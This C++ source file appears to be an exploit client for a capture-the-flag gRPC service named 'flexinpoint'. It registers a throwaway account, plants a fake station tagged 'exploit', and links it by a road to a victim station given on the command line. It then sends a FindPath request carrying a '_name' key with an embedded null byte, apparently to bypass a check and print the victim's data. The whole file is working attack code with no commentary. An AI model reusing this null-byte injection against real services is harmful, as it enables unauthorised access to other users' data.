#include "structs/flexinpoint.grpc.fb.h"
#include "structs/flexinpoint_generated.h"
#include <fmt/format.h>
#include <grpcpp/grpcpp.h>
#include <grpcpp/support/status.h>
#include <iostream>
#include <random>

std::random_device R;
constexpr std::string_view kAlphabet{"abcdefghijklmnopqrstuvwxyz"};
constexpr size_t kServicePort = 50051;

std::string rnd_string() {
  std::string str;
  str.reserve(16);
  for (size_t i = 0; i < 16; ++i) {
    str.push_back(kAlphabet[std::uniform_int_distribution<size_t>(
        0, kAlphabet.size() - 1)(R)]);
  }
  return str;
}

int main(int argc, const char *argv[]) {
  if (argc != 3) {
    std::cerr << "needed args: [IP] [ATTACK_DATA]" << std::endl;
    return 1;
  }

  std::string ip{fmt::format("{}:{}", argv[1], kServicePort)};
  std::string attack_station{argv[2]};
  std::string username{rnd_string()};
  std::string fake_station{rnd_string()};
  std::string attribute{rnd_string()};

  auto stub = flexinpoint::FlexinPoint::NewStub(
      grpc::CreateChannel(ip, grpc::InsecureChannelCredentials()));

  auto context = std::make_unique<grpc::ClientContext>();
  flatbuffers::grpc::Message<flexinpoint::RegisterResponse>
      register_response_msg;
  flatbuffers::grpc::MessageBuilder register_mb;
  auto register_request_offset = flexinpoint::CreateRegisterRequest(
      register_mb, register_mb.CreateString(username));
  register_mb.Finish(register_request_offset);
  auto register_request =
      register_mb.ReleaseMessage<flexinpoint::RegisterRequest>();
  stub->Register(context.get(), register_request, &register_response_msg);

  auto key = register_response_msg.GetRoot()->key()->str();

  context = std::make_unique<grpc::ClientContext>();
  flexbuffers::Builder add_station_fbb;
  add_station_fbb.Vector([&add_station_fbb, &fake_station, &attribute]() {
    add_station_fbb.Vector([&add_station_fbb, &attribute]() {
      add_station_fbb.String("exploit");
      add_station_fbb.String(attribute);
    });
    add_station_fbb.Vector([&add_station_fbb, &fake_station]() {
      add_station_fbb.String("_name");
      add_station_fbb.String(fake_station);
    });
    add_station_fbb.Vector([&add_station_fbb]() {
      add_station_fbb.String("_description");
      add_station_fbb.String(rnd_string());
    });
  });
  add_station_fbb.Finish();
  flatbuffers::grpc::MessageBuilder add_station_mb;
  auto add_station_request_offset = flexinpoint::CreateAddStationRequest(
      add_station_mb, add_station_mb.CreateString(key),
      add_station_mb.CreateVector(add_station_fbb.GetBuffer()));
  add_station_mb.Finish(add_station_request_offset);
  auto add_station_request =
      add_station_mb.ReleaseMessage<flexinpoint::AddStationRequest>();
  flatbuffers::grpc::Message<flexinpoint::AddStationResponse>
      add_station_response_msg;
  stub->AddStation(context.get(), add_station_request,
                   &add_station_response_msg);

  context = std::make_unique<grpc::ClientContext>();
  flatbuffers::grpc::MessageBuilder add_road_mb;
  auto add_road_request_offset = flexinpoint::CreateAddRoadRequest(
      add_road_mb, add_road_mb.CreateString(key),
      add_road_mb.CreateString(fake_station),
      add_road_mb.CreateString(attack_station), 1);
  add_road_mb.Finish(add_road_request_offset);
  auto add_road_request =
      add_road_mb.ReleaseMessage<flexinpoint::AddRoadRequest>();
  flatbuffers::grpc::Message<flexinpoint::AddRoadResponse>
      add_road_response_msg;
  stub->AddRoad(context.get(), add_road_request, &add_road_response_msg);

  context = std::make_unique<grpc::ClientContext>();
  flexbuffers::Builder find_path_fbb;
  find_path_fbb.Vector([&find_path_fbb, &attribute, &attack_station]() {
    find_path_fbb.Vector([&find_path_fbb, &attribute]() {
      find_path_fbb.String("exploit");
      find_path_fbb.String(attribute);
    });
    find_path_fbb.Vector([&find_path_fbb, &attack_station]() {
      std::string exploit_string{"_name"};
      exploit_string.push_back('\0');
      find_path_fbb.String(std::move(exploit_string));
      find_path_fbb.String(attack_station);
    });
  });
  find_path_fbb.Finish();
  flatbuffers::grpc::MessageBuilder find_path_mb;
  auto find_path_request_offset = flexinpoint::CreateFindPathRequest(
      find_path_mb, find_path_mb.CreateString(key),
      find_path_mb.CreateVector(find_path_fbb.GetBuffer()),
      find_path_mb.CreateString(fake_station),
      find_path_mb.CreateString(attack_station));
  find_path_mb.Finish(find_path_request_offset);
  auto find_path_request =
      find_path_mb.ReleaseMessage<flexinpoint::FindPathRequest>();
  flatbuffers::grpc::Message<flexinpoint::FindPathResponse>
      find_path_response_msg;
  stub->FindPath(context.get(), find_path_request, &find_path_response_msg);

  std::cout << find_path_response_msg.GetRoot()->path()->string_view()
            << std::endl;
}
